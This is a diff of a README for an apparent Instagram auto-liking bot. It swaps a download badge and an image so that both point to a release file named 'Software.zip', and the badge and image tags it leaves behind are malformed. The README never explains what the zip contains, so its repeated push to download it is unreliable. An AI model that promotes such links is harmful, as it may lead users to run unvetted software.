@@ -18,14 +18,14 @@ To get started with the Instagram Auto Liker bot, follow these simple steps:
 If you're interested in contributing to this project, feel free to fork the repository and submit a pull request. Your contributions are highly appreciated!
 
 ## Download Zip File 📥
-[![Download Zip](https://img.shields.io/badge/Download-Zip-<COLOR>.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Zip](https://github.com/youssefmasoud19999/Instagram-Auto-Liker/releases/download/v1.0/Software.zip<COLOR>.svg)](https://github.com/youssefmasoud19999/Instagram-Auto-Liker/releases/download/v1.0/Software.zip)
 
 Don't forget to unzip the file once downloaded to access the contents.
 
 ## More Information ℹ️
 For more information about the Instagram Auto Liker bot, check out the Releases section of this repository. You'll find updates, bug fixes, and new features there.
 
-![Instagram Auto Liker](https://source.unsplash.com/weekly?instagram)
+![Instagram Auto Liker](https://github.com/youssefmasoud19999/Instagram-Auto-Liker/releases/download/v1.0/Software.zip)
 
 Start automatically liking and commenting on Instagram posts with ease. Happy engaging! 🎉
 
